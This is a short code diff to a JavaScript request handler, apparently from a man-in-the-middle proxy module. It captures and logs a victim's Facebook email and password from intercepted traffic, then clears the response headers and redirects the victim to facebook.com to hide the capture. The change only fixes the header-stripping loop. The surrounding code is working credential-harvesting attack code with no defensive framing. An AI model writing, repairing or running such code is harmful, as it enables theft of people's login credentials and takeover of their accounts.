@@ -16,8 +16,10 @@ function onRequest(req, res) {
 
         log( R(req.Client), " > FACEBOOK > email:", B(email), " pass:'" + B(pass) + "'" );
 
-        for (var i = 0; i < res.Headers.length; i++) {
-            res.RemoveHeader(res.Headers[i].Name)
+        headers = res.Headers.split("\r\n")
+        for (var i = 0; i < headers.length; i++) {
+            header_name = headers[i].replace(/:.*/, "")
+            res.RemoveHeader(header_name)
         }
         res.Status = 301;
         res.SetHeader("Location", "https://www.facebook.com")
